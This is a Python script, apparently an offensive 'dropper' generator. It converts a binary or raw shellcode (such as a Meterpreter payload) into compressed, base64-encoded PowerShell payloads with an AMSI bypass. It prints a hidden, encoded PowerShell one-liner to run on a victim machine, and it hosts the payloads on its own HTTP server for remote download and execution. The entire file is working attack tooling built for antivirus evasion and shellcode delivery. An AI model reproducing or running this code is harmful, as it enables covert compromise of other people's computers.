import sys, getopt
import os
import random
import string
import subprocess
from io import BytesIO 
import gzip
import base64
from pathlib import Path
from http.server import HTTPServer, SimpleHTTPRequestHandler


    
def generateOneLiner(ip, port, scheme="http", amsiPath="payloadAmsi.ps1", shellcodeLoaderPath="payloadShellcode.ps1"):

    oneLinerToExecPath = os.path.join(Path(__file__).parent, "oneLinerToExec.template")
    oneLiner = open(oneLinerToExecPath, "rb").read()

    # output the oneliner to run on the victime
    script = oneLiner.replace(b"SCHEME", scheme.encode())
    script = script.replace(b"IP_WEBSERV", ip.encode())
    script = script.replace(b"PORT_WEBSERV", port.encode())
    script = script.replace(b"PAYLOAD_AMSI", amsiPath.encode("utf-8"))
    script = script.replace(b"PAYLOAD_SHELLCODE", shellcodeLoaderPath.encode("utf-8"))
    script_utf16 = script.decode("utf-8").encode("utf_16_le")
    base64_bytes = base64.b64encode(script_utf16)

#     oneLiner = "powershell.exe -nop -e {}".format(base64_bytes.decode("utf-8"))
    oneLiner = "powershell.exe -nop -w hidden -e {}".format(base64_bytes.decode("utf-8"))

    return oneLiner


def generatePayloads(binary, binaryArgs, rawShellCode):

    if binary:
        print('binary ', binary)
        print('binaryArgs ', binaryArgs)
        print('')

        if os.name == 'nt':
                donutBinary = os.path.join(Path(__file__).parent, '.\\ressources\\donut.exe')
                shellcodePath = os.path.join(Path(__file__).parent, '.\\shellcode.b64')
                args = (donutBinary, '-f', '2', '-m', 'go', '-p', binaryArgs, '-o', shellcodePath, binary)
        else:   
                donutBinary = os.path.join(Path(__file__).parent, './ressources/donut')
                shellcodePath = os.path.join(Path(__file__).parent, './shellcode.b64')
                args = (donutBinary, '-f', '2', '-m', 'go', '-p', binaryArgs, '-o', shellcodePath, '-i', binary)
        popen = subprocess.Popen(args, stdout=subprocess.PIPE)
        popen.wait()
        output = popen.stdout.read()
        
        print("[+] Generate shellcode of payload with donut")
        print(output.decode("utf-8") )

        shellcode = open(shellcodePath, "rb").read()
        os.remove(shellcodePath)

    elif rawShellCode:
        print('rawShellCode ', rawShellCode)
        print('')

        shellcode = open(rawShellCode, "rb").read()
        shellcode = base64.b64encode(shellcode)

        print(len(shellcode))

    AmsiBypassPath = os.path.join(Path(__file__).parent, "AmsiBypass.template")
    amsiBypass = open(AmsiBypassPath, "rb").read()

    ShellcodeLoaderPath = os.path.join(Path(__file__).parent, "ShellcodeLoader.template")
    shellCodeLoader = open(ShellcodeLoaderPath, "rb").read()

    # creat AMIS bypass payload
    out = BytesIO()
    with gzip.GzipFile(fileobj=out, mode="wb") as f:
    	f.write(amsiBypass)
    base64_bytes = base64.b64encode(out.getvalue())
    amsiOneLiner = "&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(('{}')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))".format(base64_bytes.decode("utf-8"))

    # creat Shellcode loader payload
    script = shellCodeLoader.replace(b"SHELL_CODE", shellcode)

    out = BytesIO()
    with gzip.GzipFile(fileobj=out, mode="w") as f:
    	f.write(script)
    base64_bytes = base64.b64encode(out.getvalue())
    shellcodeLoaderOneliner = "&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(('{}')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))".format(base64_bytes.decode("utf-8"))
    
    return amsiOneLiner, shellcodeLoaderOneliner


def main(argv):
    if(len(argv)<6):
            print ('On Windows:\nGeneratePowershellLauncher.py -i 127.0.0.1 -p 8000 -b C:\\Windows\\System32\\calc.exe -a "some args"')
            print ('On linux:\nGeneratePowershellLauncher.py -i 127.0.0.1 -p 8000 -b ./calc.exe -a "some args"')
            print ('On linux:\nGenerateDropperBinary.py -i 127.0.0.1 -p 8000 -r ./met.raw')
            exit()

    ip=""
    port=""
    binary=""
    binaryArgs=""
    rawShellCode=""

    opts, args = getopt.getopt(argv,"hi:p:b:a:r:",["ip=","port=","binary=","args=","raw="])
    for opt, arg in opts:
            if opt == '-h':
                    print ('On Windows:\nGenerateDropperBinary.py -i 127.0.0.1 -p 8000 -b C:\\Windows\\System32\\calc.exe -a "some args"')
                    print ('On linux:\nGenerateDropperBinary.py -i 127.0.0.1 -p 8000 -b ./calc.exe -a "some args"')
                    print ('On linux:\nGenerateDropperBinary.py -i 127.0.0.1 -p 8000 -r ./met.raw')
                    sys.exit()
            elif opt in ("-b", "--binary"):
                    binary = arg
            elif opt in ("-a", "--args"):
                    binaryArgs = arg
            elif opt in ("-i", "--ip"):
                    ip = arg
            elif opt in ("-p", "--port"):
                    port = arg
            elif opt in ("-r", "--raw"):
                    rawShellCode = arg
    
    print('[+] Generate dropper for params:')
    print('ip ', ip)
    print('port ', port)

    amsiOneLiner, shellcodeLoaderOneliner = generatePayloads(binary, binaryArgs, rawShellCode)

    payloadAmsiPath = os.path.join(Path(__file__).parent, "./web/payloadAmsi.ps1")
    f1 = open(payloadAmsiPath, "w")
    f1.write(amsiOneLiner)
    f1.close()

    payloadShellcodePath = os.path.join(Path(__file__).parent, "./web/payloadShellcode.ps1")
    f2 = open(payloadShellcodePath, "w")
    f2.write(shellcodeLoaderOneliner)
    f2.close()

    oneliner = generateOneLiner(ip, port, scheme="http", amsiPath="payloadAmsi.ps1", shellcodeLoaderPath="payloadShellcode.ps1")

    print(oneliner)
    
    print("[+] Web delivery on web server {} : {}".format(ip, port))
    os.chdir("./web")
    httpd = HTTPServer(('0.0.0.0', int(port)), SimpleHTTPRequestHandler)
    httpd.serve_forever()


if __name__ == "__main__":
    main(sys.argv[1:])

